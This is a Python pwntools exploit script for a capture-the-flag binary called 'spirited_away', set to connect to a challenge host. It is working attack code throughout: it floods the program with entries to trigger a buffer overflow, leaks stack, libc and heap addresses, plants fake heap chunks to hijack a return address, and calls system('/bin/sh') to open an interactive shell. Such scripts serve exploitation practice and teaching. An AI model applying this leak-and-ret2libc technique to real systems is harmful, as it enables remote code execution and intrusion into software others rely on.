#!/usr/bin/python3
from pwn import *

PATH = "spirited_away"
LIBC = "libc_32.so.6"
HOST = args.get("HOST", "chall.cscv.vn")
PORT = int(args.get("PORT", 1234))
SSL = False

patched = PATH + "_patched"
exe = context.binary = ELF(PATH, checksec=False)
libc = ELF(LIBC, checksec=False) if LIBC else None 
context.terminal = ['tmux', 'splitw', '-h', '-p', '55']

info = lambda x, msg="Test": log.info(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data=b"": p.sendlineafter(msg, data)
sn = lambda num=0: sleep(0.1) or p.sendline(str(num).encode())
sna = lambda msg, num=0: p.sendlineafter(msg, str(num).encode())

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=SSL)
    elif os.path.exists(patched): 
        return process(patched)
    else:
        return process(PATH)

def GDB():
    if args.GDB:
        gdb.attach(p, gdbscript=gs)
    #sleep(1)


def _name(name):
    sa(b"name: ", name)

def _age(age):
    sna(b"age: ", age)

def _reason(reason):
    sa(b"movie? ", reason)

def _comment(comment):
    sa(b"comment: ", comment)

def _another(x):
    sa(b"<y/n>: ", x)

def _call(name, age, reason, comment, x, full):
    _name(name) if full else None
    _age(age)
    _reason(reason)
    _comment(comment) if full else None
    _another(x) if x else None


gs = '''
    b*0x0804873E
    b*0x080488C9
c
'''

p = conn()


for i in range(1, 101):
    if i < 11 : 
        _call(b"name", i, b"reason", b"comment", b"y", 1)
    else:
        _call(b"name", i, b"reason", b"comment", b"y", 0)

_call(b"1", u32(b"BBBB"), b"A"*80, b"B"*80, 0, 1)
p.recvuntil(b"A"*80)
stack = u32(p.recv(4)) - 0x20
p.recv(4)
libc.address = u32(p.recv(4)) - 0x1b0d60
log.warn(hex(stack))
log.warn(hex(libc.address))

p.recvuntil(b"B"*84)
heap = u32(p.recv(4))
log.warn(hex(heap))
_another(b"y")

GDB()

reason = p32(0) + p32(0x41) + b'A'*0x38 + p32(0) +  p32(0x21)
comment = b'B'*80 + b'B'*4 + p32(stack-80+8)
_call(b"1", 1, reason, comment, b"y", 1)
payload = b"A"*(80-8+4) + p32(libc.sym.system) + p32(libc.sym.exit) + p32(stack-80*2-8)
_call(payload, 1, b"1", b"/bin/sh\0", b"n", 1)

p.interactive()
